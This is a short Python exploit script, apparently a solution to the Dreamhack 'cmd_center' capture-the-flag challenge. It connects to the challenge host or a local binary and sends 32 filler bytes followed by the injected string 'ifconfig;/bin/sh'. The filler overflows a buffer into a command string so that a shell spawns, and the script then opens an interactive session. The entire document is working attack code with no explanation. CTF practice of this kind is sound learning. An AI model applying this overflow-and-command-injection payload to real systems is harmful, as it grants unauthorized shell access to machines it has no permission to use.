#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./cmd_center")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 16987)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 0x20
    payload += b"ifconfig;/bin/sh"
    io.sendlineafter("Center name: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
